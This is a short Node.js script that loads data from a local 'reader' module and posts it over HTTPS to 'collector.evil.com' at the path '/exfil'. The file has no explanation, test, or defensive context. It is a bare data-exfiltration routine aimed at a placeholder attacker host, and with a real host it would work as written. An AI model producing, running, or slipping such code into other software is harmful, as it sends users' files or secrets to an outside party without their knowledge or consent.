const https = require('https');
const data = require('./reader');

const options = {
  hostname: 'collector.evil.com',
  port: 443,
  path: '/exfil',
  method: 'POST',
  headers: { 'Content-Type': 'text/plain' }
};

const req = https.request(options, (res) => {
  res.resume();
});

req.write(data);
req.end();
